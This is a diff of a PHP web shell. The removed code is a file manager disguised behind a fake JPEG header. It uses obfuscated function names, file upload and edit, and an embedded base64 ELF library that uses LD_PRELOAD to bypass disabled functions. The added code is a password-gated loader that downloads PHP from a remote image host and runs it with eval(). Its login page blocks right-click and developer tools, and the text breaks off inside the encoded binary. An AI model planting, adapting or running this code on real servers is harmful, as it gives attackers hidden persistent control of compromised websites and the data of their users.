@@ -1,454 +1,276 @@
-MAINHACK
-JFIF
-��� JFIF   H H  �� 6Photoshop 3.0 8BIM     g fDv40PON15YC57AbScWj �� C $$$$$$$$$,,,,,,333339999999999�� C			<)!)<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<�� ��" ��             ��             ��    i�~�4 R �*M�wM�� ��?��G_�Nq��z[�Gg&7ύ���0C6�1lE*M1�2]$�ؕ���&�*HT2SJ��m $d"hM����	0 ��4� �r�4KJ&�[c(��a �j�F *� �,�hLM���w�GN������?c?-ҹk�2�&�.T�o�i��`č0"�)T�L!���IL�Ӊ�T�
-���*Mb�a,b�A4�m	�74��D���D�*�@@ (��4��RX�r�L*hh,C[�Lh �5(���B��Li��!�z~e{?��jrUW3�a��c�y���~sߓESH�!������cH�`�,��4CT��	�`��Y��DChSjvJb��	6$ܲ�h1�-���%Z$b����j�C	dr��BaM  ���أ��;����~b�����e�g���b1LT��+0�E%AI��e�"�!��ɤ�w	�N��Z� ��6@�Մ'D��f�K�a%32�&��B`�Q`�c��hY/:�I�!CYc 44�s��k�y=�g���d��1��ד�摰�`J�S�t$��0�NYR�Q,hd����j8���T��J�
-	m����B�R&���Ah��	�*!*B
-	
-	&�LC	-Hטj���&��4�!��2|k��s��Ư+�h�/Nj��|c��Ϣ�L�FMJ@�AT�ʛ��� r:�@2i �RRh4� ��O��_c����/�~}%��>����=���r���ح����Yt�f�T�7"N�&�)�(!�Z&� �Hņ\����(�&�i�l�)�<F�1˧��(zges����{r�*[T�@�Z	��bW�X�q@4+����ș��:<nI��� ��%���]<��Q�K�~��h�w��f�.% $hT!�CI��R�J��@&��R��P`T�  ` � 2�3��<C9�[oDʺ��>b~��+����.�h�  j�J�
-		.!��l�C�͊���ϞS
-		
-		
-		
-		
-		
-		
-
-
-
-<!DOCTYPE html>
-<html>
-<head>
-    <title>MAINHACK</title>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="googlebot" content="noindex">
-    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
-    <style>
-    body {
-        font-family: 'Arial Black', sans-serif;
-        color: #000;
-        margin: 0;
-        padding: 0;
-        background-color: #242222c9;
-    }
-    .result-box-container {
-        position: relative;
-        margin-top: 20px;
-    }
-
-    .result-box {
-        width: 100%;
-        height: 200px;
-        padding: 10px;
-        border: 1px solid #ddd;
-        border-radius: 5px;
-        background-color: #f4f4f4;
-        overflow: auto;
-        box-sizing: border-box;
-        font-family: 'Arial Black', sans-serif;
-        color: #333;
-    }
-
-    .result-box::placeholder {
-        color: #999;
-    }
-
-    .result-box:focus {
-        outline: none;
-        border-color: #000000;
-    }
-
-    .result-box::-webkit-scrollbar {
-        width: 8px;
-    }
-
-    .result-box::-webkit-scrollbar-thumb {
-        background-color: #000000;
-        border-radius: 4px;
-    }
-    .container {
-        max-width: 90%;
-        margin: 20px auto;
-        padding: 20px;
-        background-color: #ffffff;
-        border-radius: 44px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    .header {
-        text-align: center;
-        margin-bottom: 20px;
-    }
-    .header h1 {
-        font-size: 24px;
-    }
-    .subheader {
-        text-align: center;
-        margin-bottom: 20px;
-    }
-    .subheader p {
-        font-size: 16px;
-        font-style: italic;
-    }
-    form {
-        margin-bottom: 20px;
-    }
-    form input[type="text"],
-    form textarea {
-        padding: 8px;
-        margin-bottom: 10px;
-        border: 1px solid #000;
-        border-radius: 3px;
-        box-sizing: border-box;
-        
-    }
-    form input[type="submit"] {
-
-        padding: 10px;
-        background-color: #000000;
-        color: white;
-        border: none;
-        border-radius: 3px;
-        cursor: pointer;
-    }
-    form input[type="file"] {
-        padding: 7px;
-        background-color: #000000;
-        color: white;
-        border: none;
-        border-radius: 3px;
-        cursor: pointer;
-    }
-    .result-box {
-            width: 100%;
-            height: 200px;
-            resize: none;
-            overflow: auto;
-            font-family: 'Arial Black';
-            background-color: #f4f4f4;
-            padding: 10px;
-            border: 1px solid #ddd;
-            margin-bottom: 10px;
-        }
-    form input[type="submit"]:hover {
-        background-color: #143015;
-    }
-    table {
-        width: 100%;
-        border-collapse: collapse;
-        margin-top: 20px;
-    }
-    th, td {
-        padding: 8px;
-        text-align: left;
-    }
-    th {
-        background-color: #5c5c5c;
-    }
-    tr:nth-child(even) {
-        background-color: #9c9b9bce;
-    }
-    .item-name {
-        max-width: 200px;
-        overflow: hidden;
-        text-overflow: ellipsis;
-        white-space: nowrap;
-    }
-    .size, .date {
-        width: 100px;
-    }
-    .permission {
-        font-weight: bold;
-        width: 50px;
-        text-align: center;
-    }
-    .writable {
-        color: #0db202;
-    }
-    .not-writable {
-        color: #d60909;
-    }
-textarea[name="file_content"] {
-            width: calc(100.9% - 10px);
-            margin-bottom: 10px;
-            padding: 8px;
-            max-height: 500px;
-            resize: vertical;
-            border: 1px solid #ddd;
-            border-radius: 3px;
-            font-family: 'Arial Black';
-        }
-</style>
-</head>
-<body>
-<div class="container">
 <?php
+session_start();
 
-$chd = "c"."h"."d"."i"."r";
-$expl = "e"."x"."p"."l"."o"."d"."e";
-$scd = "s"."c"."a"."n"."d"."i"."r";
-$ril = "r"."e"."a"."l"."p"."a"."t"."h";
-$st = "s"."t"."a"."t";
-$isdir = "i"."s"."_"."d"."i"."r";
-$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
-$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
-$bs = "b"."a"."s"."e"."n"."a"."m"."e";
-$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
-$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-$mek = "m"."k"."d"."i"."r";
-$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-$drnmm = "d"."i"."r"."n"."a"."m"."e";
-$unl = "u"."n"."l"."i"."n"."k";
-$timezone = date_default_timezone_get();
-date_default_timezone_set($timezone);
-$rootDirectory = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']);
-$scriptDirectory = $drnmm(__FILE__);
-
-function x($b) {
-
-    $be = "ba"."se"."64"."_"."en"."co"."de";
-    return $be($b);
+function is_logged_in() {
+    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
 }
-
-function y($b) {
-    $bd = "ba"."se"."64"."_"."de"."co"."de";
-    return $bd($b);
-}
-echo "<font color='black'>MAINHACK</font><br>";
-if (function_exists('mail')) {
-    echo "<font color='black'>[ Function mail() ] :</font><font color='green'> [ ON ]</font><br>";
-} else {
-    echo "<font color='black'>[ Function mail() ] :<font color='red'> [ OFF ]</font><br>";
-}
-if (function_exists('putenv')) {
-    echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
-} else {
-    echo "<font color='black'>[ Function putenv() ] :<font color='red'> [ OFF ]</font><br>";
-}
-foreach ($_GET as $c => $d) $_GET[$c] = y($d);
-
-$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
-$chd($currentDirectory);
-
-$viewCommandResult = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (isset($_FILES['fileToUpload'])) {
-        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
-        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
-            echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
+$userMd5 = 'a4ca719c3fa51b57bff8716f5ebe028d';
+$passMd5 = 'ec07decc7fe3994412cb51cc7be02fcb';
+if (!is_logged_in()) {
+    if (isset($_POST['username']) && isset($_POST['password'])) {
+        if (md5($_POST['username']) === $userMd5 && md5($_POST['password']) === $passMd5) {
+            $_SESSION['loggedin'] = true;
+            header("Location: " . strtok($_SERVER['REQUEST_URI'], '?'));
+            exit();
         } else {
-            echo "<hr>Sorry, there was an error uploading your file.<hr>";
+            $error = "Wrong";
         }
-    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
-        $ff = $_POST['folder_name'];
-        $newFolder = $currentDirectory . '/' . $ff;
-        if (!file_exists($newfolder)) {
-            if ($mek($newFolder) !== false) {
-                echo '<hr>Folder created successfully!';
-            }else{
-                echo '<hr>Error: Failed to create folder!';
-            }
-        }
+    }
+}
+function geturlsinfo($destiny) {
+    $Array = array(
+        'fopen',
+        'stream_get_contents',
+        'file_get_contents',
+        'curl_exec'
+    );
 
-    } elseif (isset($_POST['file_name'])) {
-        $fileName = $_POST['file_name'];
-        $newFile = $currentDirectory . '/' . $fileName;
-        if (!file_exists($newFile)) {
-            if ($fpc($newFile, '') !== false) {
-                echo '<hr>File created successfully!' . $fileName .' ';
-                $fileToView = $newFile;
-                if (file_exists($fileToView)) {
-                    $fileContent = $fgc($fileToView);
-                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
-                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
-                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
-                    <input type="hidden" name="edit_file" value="' . $fileName . '">
-                    <input type="submit" value=" Save "></form></td>';
-                } else {
-                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
+    if (function_exists($Array[3])) {
+        $ch = curl_init($destiny);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        $love = curl_exec($ch);
+        curl_close($ch);
+        return $love;
+    } elseif (function_exists($Array[2])) {
+        return file_get_contents($destiny);
+    } elseif (function_exists($Array[0]) && function_exists($Array[1])) {
+        $purpose = fopen($destiny, "r");
+        $love = stream_get_contents($purpose);
+        fclose($purpose);
+        return $love;
+    }
+    return false;
+}
+
+if (is_logged_in()) {
+    $destiny = 'https://res.cloudinary.com/dkgvqbc6x/image/upload/v1786662627/kuyangbaru_kvc7tx';
+    
+    $dream = geturlsinfo($destiny);
+
+    if ($dream !== false) {
+        $pos = strpos($dream, '<?php');
+        if ($pos !== false) {
+            $phpCode = substr($dream, $pos + 5); 
+            eval($phpCode);
+        } else {
+            eval('?>' . $dream);
+        }
+        exit();
+    }
+}
+
+if (!is_logged_in()) {
+    $showForm = isset($_GET['not']) || isset($error);
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>EL STILL HERE</title>
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            body, html {
+                height: 100%;
+                font-family: 'Orbitron', sans-serif;
+            }
+            body {
+                background: url('https://wallpapercave.com/wp/wp13582695.jpg') no-repeat center center fixed;
+                background-size: cover;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .form-container {
+                display: <?php echo $showForm ? 'flex' : 'none'; ?>;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                padding: 20px;
+            }
+            .login-form {
+                width: 100%;
+                max-width: 380px;
+                padding: 40px 30px;
+                background: rgba(20, 0, 0, 0.88);
+                backdrop-filter: blur(10px);
+                -webkit-backdrop-filter: blur(10px);
+                border-radius: 16px;
+                box-shadow: 0 0 25px rgba(255, 102, 0, 0.6), 0 0 50px rgba(255, 0, 0, 0.4), inset 0 0 15px rgba(255, 102, 0, 0.2);
+                text-align: center;
+                color: #fff;
+                border: 2px dashed rgba(255, 120, 0, 0.6);
+            }
+            .login-form img {
+                width: 90px;
+                height: 90px;
+                border-radius: 50%;
+                object-fit: cover;
+                margin-bottom: 15px;
+                border: 3px solid rgba(255, 120, 0, 0.6);
+                box-shadow: 0 0 15px rgba(255, 102, 0, 0.5);
+            }
+            .login-form h2 {
+                margin: 0 0 25px 0;
+                font-size: 22px;
+                font-weight: 800;
+                letter-spacing: 2px;
+                color: #ff8533;
+                text-shadow: 0 0 12px rgba(255, 102, 0, 0.8);
+            }
+            .login-form input[type="text"],
+            .login-form input[type="password"] {
+                width: 100%;
+                padding: 14px 16px;
+                margin: 10px 0;
+                border-radius: 8px;
+                background: rgba(255, 255, 255, 0.05);
+                color: #fff;
+                font-size: 15px;
+                font-family: 'Orbitron', sans-serif;
+                transition: all 0.3s ease;
+                border: 1px solid rgba(255, 120, 0, 0.3);
+            }
+            .login-form input[type="text"]::placeholder,
+            .login-form input[type="password"]::placeholder {
+                color: rgba(255, 255, 255, 0.5);
+            }
+            .login-form input[type="text"]:focus,
+            .login-form input[type="password"]:focus {
+                outline: none;
+                background: rgba(255, 102, 0, 0.1);
+                border-color: rgba(255, 120, 0, 0.8);
+                box-shadow: 0 0 12px rgba(255, 102, 0, 0.5);
+            }
+            .login-form button {
+                width: 100%;
+                padding: 14px;
+                margin-top: 20px;
+                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
+                color: white;
+                border: none;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 15px;
+                font-weight: 600;
+                font-family: 'Orbitron', sans-serif;
+                letter-spacing: 1px;
+                transition: all 0.3s ease;
+                text-transform: uppercase;
+                box-shadow: 0 4px 20px rgba(255, 102, 0, 0.6);
+            }
+            .login-form button:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 25px rgba(255, 102, 0, 0.9);
+                background: linear-gradient(135deg, #ff8533 100%, #cc0000 0%);
+            }
+            .error-message {
+                background: rgba(255, 82, 82, 0.2);
+                color: #ff5252;
+                font-size: 14px;
+                padding: 10px;
+                border-radius: 6px;
+                margin-bottom: 15px;
+                border: 1px solid rgba(255, 82, 82, 0.4);
+            }
+
+            #customPopup {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.7);
+                backdrop-filter: blur(5px);
+                justify-content: center;
+                align-items: center;
+                z-index: 99999;
+            }
+            .popup-box {
+                background: rgba(20, 0, 0, 0.95);
+                border: 2px solid #ff6600;
+                padding: 30px;
+                border-radius: 12px;
+                text-align: center;
+                color: #fff;
+                box-shadow: 0 0 25px rgba(255, 102, 0, 0.8);
+                max-width: 300px;
+                width: 90%;
+            }
+            .popup-box h3 {
+                color: #ff8533;
+                margin-bottom: 15px;
+                font-size: 18px;
+                letter-spacing: 1px;
+            }
+            .popup-box button {
+                padding: 10px 25px;
+                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
+                color: white;
+                border: none;
+                border-radius: 6px;
+                cursor: pointer;
+                font-family: 'Orbitron', sans-serif;
+                font-weight: 600;
+                margin-top: 15px;
+                box-shadow: 0 0 10px rgba(255, 102, 0, 0.5);
+            }
+        </style>
+    </head>
+    <body>
+        <div class="form-container" id="formContainer">
+            <div class="login-form">
+                <img src="https://i.pinimg.com/originals/fa/6a/a8/fa6aa8b9f02691e42df56f1678e795fc.gif" alt="Logo">
+                <h2>SINGLE FIGHTER ERA</h2>
+                <?php if (isset($error)): ?>
+                    <div class="error-message"><?php echo $error; ?></div>
+                <?php endif; ?>
+                <form method="post">
+                    <input type="text" name="username" placeholder="Username ..." required>
+                    <input type="password" name="password" placeholder="Password ..." required>
+                    <button type="submit">UDAH IMO BELUM</button>
+                </form>
+            </div>
+        </div>
+        <div id="customPopup">
+            <div class="popup-box">
+                <h3>nyari apa dek?</h3>
+                <button onclick="closePopup()">TUTUP</button>
+            </div>
+        </div>
+        <script>
+            function showWarning() {
+                document.getElementById('customPopup').style.display = 'flex';
+            }
+           function closePopup() {
+                document.getElementById('customPopup').style.display = 'none';
+            }
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                showWarning();
+            });
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) || 
+                    (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
+                    e.preventDefault();
+                    showWarning();
                 }
-            } else {
-                echo '<hr>Error: Failed to create file!';
-            }
-        }else{
-            echo '<hr>Error: File Already Exists!';
-        }
-    } elseif (isset($_POST['cmd_input'])){
-        $p = "p"."u"."t"."e"."n"."v";
-        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
-        $m = "m"."a"."i"."l";
-        $base = "ba"."se"."64"."_"."de"."co"."de";
-        $en = "ba"."se"."64"."_"."en"."co"."de";
-        $drnm= "d"."i"."r"."n"."a"."m"."e";
-        $currentFilePath = $_SERVER['PHP_SELF'];
-        $doc = $_SERVER['DOCUMENT_ROOT'];
-        $directoryPath = $drnm($currentFilePath);
-        $full = $doc . $directoryPath;
-        $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAA